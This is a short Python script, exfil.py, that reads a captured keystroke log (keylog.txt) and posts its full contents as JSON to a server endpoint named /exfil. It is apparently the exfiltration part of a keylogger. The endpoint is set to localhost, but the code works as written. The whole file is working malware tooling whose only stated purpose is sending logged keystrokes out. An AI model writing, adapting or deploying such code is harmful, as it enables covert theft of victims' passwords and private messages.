# exfil.py — send keylog file to remote server
import requests
import os

URL = "http://localhost:8000/exfil"
FILE = "keylog.txt"

def send_keylog():
    if not os.path.exists(FILE):
        print("[!] No keylog to exfil.")
        return

    with open(FILE, "r") as f:
        content = f.read()

    data = {
        "filename": FILE,
        "content": content
    }

    try:
        r = requests.post(URL, json=data)
        print(f"[+] Keylog exfiltrated. Status: {r.status_code}")
    except Exception as e:
        print(f"[!] Exfiltration failed: {e}")